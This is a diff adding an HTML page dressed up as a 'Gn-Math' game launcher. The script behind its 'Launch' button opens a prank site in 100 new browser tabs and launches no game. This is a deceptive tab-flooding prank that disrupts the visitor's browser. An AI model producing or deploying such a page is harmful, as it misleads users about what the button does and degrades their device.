@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Gn-math</title>
+    <style>
+      body {
+        font-family: 'poppins', sans-serif;
+        background: linear-gradient(90deg, #0c4b63 0%, #bf24a1 100%);
+      }
+
+      h1 {
+        color: white;
+        text-align: center;
+        text-shadow:
+        0 0 5px #fff,
+        0 0 10px #db0d0d,
+        0 0 15px #e24b4b,
+        0 0 20px #f92b2b
+      }
+
+      div {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: #cd3e3e;
+        padding: 50px;
+        border-radius: 15px;
+        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.6)
+      }
+
+
+      button {
+        color: white;
+        font-size: 1em;
+        font-weight: bold;
+        background: linear-gradient(90deg, #8f2e7c 0%, #1e6274 100%);
+        width: 200px;
+        height: 40px;
+        border-radius: 10px;
+        border: 1px solid white;
+        cursor: pointer;
+        transition: ease-in-out 0.3s;
+        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+
+      }
+
+      button:hover {
+        transform: scale(1.05);
+        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4)
+      }
+    </style>
+  </head>
+  <body>
+    <div>
+    <h1>Gn-Math</h1>
+    <button onclick="gnmath()">Launch</button>
+    </div>
+    <script>
+      function gnmath() {
+        for (let i = 0; i < 100; i++) {
+          window.open('https://trollface.dk/', '_blank');
+        }
+      }
+    </script>
+
+  </body>
+</html>
